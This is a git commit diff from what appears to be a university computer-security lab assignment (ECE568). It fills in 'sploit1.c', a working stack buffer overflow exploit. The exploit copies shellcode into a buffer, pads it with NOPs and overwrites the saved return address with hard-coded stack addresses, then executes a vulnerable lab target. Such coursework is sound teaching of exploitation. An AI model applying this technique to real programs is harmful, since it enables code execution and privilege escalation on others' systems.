e7f1a124e4482f9c71245d35e4fe0837586e0206
Mufeng Wang <mufeng.wang@mail.utoronto.ca>
2022-01-26 21:44:09 -0500

    sploit1 done

--- ECE568-lab1/sploits/sploit1.c
+++ ECE568-lab1/sploits/sploit1.c
@@ -5,21 +5,36 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target1"
+int rip_addr = 0x2021fec8;
+int buf_addr = 0x2021fe50;
+char buf_addr_str[] = "\x50\xfe\x21\x20";
 
 int
 main ( int argc, char * argv[] )
 {
-	char *	args[3];
-	char *	env[1];
+    char *args[3];
+    char *env[1];
 
-	args[0] = TARGET;
-	args[1] = "hi there";
-	args[2] = NULL;
+    int str_len = rip_addr - buf_addr + 4;
+    char exploit_str[str_len];
+    memset(exploit_str, 0, str_len);
 
-	env[0] = NULL;
+    strcpy(exploit_str, shellcode);
+    int pos = strlen(shellcode);
+    while(pos < rip_addr - buf_addr) {
+        strcat(exploit_str, NOP);
+        ++pos;
+    }
+    strcpy(exploit_str + rip_addr - buf_addr, buf_addr_str);
 
-	if ( execve (TARGET, args, env) < 0 )
-		fprintf (stderr, "execve failed.\n");
+    args[0] = TARGET;
+    args[1] = exploit_str;
+    args[2] = NULL;
 
-	return (0);
+    env[0] = NULL;
+
+    if (execve(TARGET, args, env) < 0)
+        fprintf(stderr, "execve failed.\n");
+
+    return (0);
 }
